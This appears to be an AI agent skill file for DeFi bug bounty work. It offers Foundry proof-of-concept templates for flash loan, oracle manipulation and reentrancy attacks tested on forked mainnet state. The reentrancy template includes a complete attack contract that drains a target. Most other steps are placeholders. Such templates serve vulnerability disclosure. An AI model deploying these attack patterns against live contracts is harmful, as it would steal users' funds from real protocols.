---
name: vuln-web3-modern
description: "Shared Foundry PoC templates for modern DeFi scanners. See vuln-web3-restaking, vuln-web3-aa, vuln-web3-l2, vuln-web3-intents for focused scanning."
allowed-tools: Read Write
argument-hint: <path to threat-model.md, defaults to ./assessment/threat-model.md>
---

# Bug Bounty — Modern DeFi: Shared PoC Templates

This skill provides shared Foundry PoC templates used by the focused modern DeFi scanners:

| Scanner | Focus |
|---------|-------|
| `vuln-web3-restaking` | EigenLayer/Symbiotic restaking, AVS, slashing, operator delegation |
| `vuln-web3-aa` | Account Abstraction (ERC-4337), paymasters, smart accounts |
| `vuln-web3-l2` | L2/Rollup bridges, sequencer, cross-domain messaging |
| `vuln-web3-intents` | Intent/solver protocols, Dutch auctions, cross-chain intents |

Run the focused scanners directly. This file is a reference for PoC writing.

---

## Foundry PoC Templates

### Basic Exploit Test

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/VulnerableContract.sol";

contract ExploitTest is Test {
    VulnerableContract target;
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {
        target = new VulnerableContract();
        deal(address(target), 100 ether);
        deal(victim, 10 ether);
    }

    function testExploit() public {
        uint256 attackerBalanceBefore = attacker.balance;
        vm.startPrank(attacker);
        // ... exploit steps ...
        vm.stopPrank();
        assertGt(attacker.balance, attackerBalanceBefore, "Exploit should profit");
    }
}
```

### Flash Loan Exploit Template

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IFlashLoanProvider {
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external;
}

contract FlashLoanExploit is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", BLOCK_NUMBER);
    }

    function testFlashLoanAttack() public {
        uint256 balanceBefore = token.balanceOf(address(this));
        lender.flashLoan(address(this), address(token), LOAN_AMOUNT, "");
        assertGt(token.balanceOf(address(this)) - balanceBefore, 0, "Should profit");
    }

    function onFlashLoan(address, address tokenAddr, uint256 amount, uint256 fee, bytes calldata)
        external returns (bytes32)
    {
        // Step 1: Manipulate state
        // Step 2: Exploit vulnerability
        // Step 3: Repay
        IERC20(tokenAddr).approve(msg.sender, amount + fee);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
```

### Oracle Manipulation Template

```solidity
contract OracleManipulationTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", BLOCK_NUMBER);
    }

    function testOracleManipulation() public {
        // Step 1: Large swap to move spot price
        deal(address(manipToken), address(this), LARGE_AMOUNT);
        manipToken.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(manipToken);
        path[1] = address(targetToken);
        router.swapExactTokensForTokens(LARGE_AMOUNT, 0, path, address(this), block.timestamp);
        // Step 2: Exploit manipulated price
        // Step 3: Swap back
    }
}
```

### Reentrancy Exploit Template

```solidity
contract ReentrancyExploit is Test {
    Target target;
    AttackContract attacker;

    function setUp() public {
        target = new Target();
        deal(address(target), 10 ether);
        attacker = new AttackContract(address(target));
        deal(address(attacker), 1 ether);
    }

    function testReentrancy() public {
        attacker.attack{value: 1 ether}();
        assertEq(address(target).balance, 0);
    }
}

contract AttackContract {
    Target immutable target;
    uint256 count;
    constructor(address _target) { target = Target(_target); }
    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }
    receive() external payable {
        if (count < 10 && address(target).balance > 0) { count++; target.withdraw(msg.value); }
    }
}
```

### Mainnet Fork Setup

```toml
# foundry.toml
[profile.default]
eth_rpc_url = "https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY"

[rpc_endpoints]
mainnet = "${ETH_RPC_URL}"
arbitrum = "https://arb-mainnet.g.alchemy.com/v2/YOUR_KEY"
optimism = "https://opt-mainnet.g.alchemy.com/v2/YOUR_KEY"
base = "https://base-mainnet.g.alchemy.com/v2/YOUR_KEY"
```

```bash
# Run with fork
forge test --fork-url mainnet --fork-block-number 19000000 -vvv
```

## Rules

- **Always write a Foundry PoC** — Immunefi requires working PoC for Critical/High.
- **Fork mainnet for realistic testing** — use actual deployed contract state.
- **Calculate profitability** — include gas costs, flash loan fees, slippage.
- **Consider multi-tx attacks** — not everything is atomic, especially on L2.
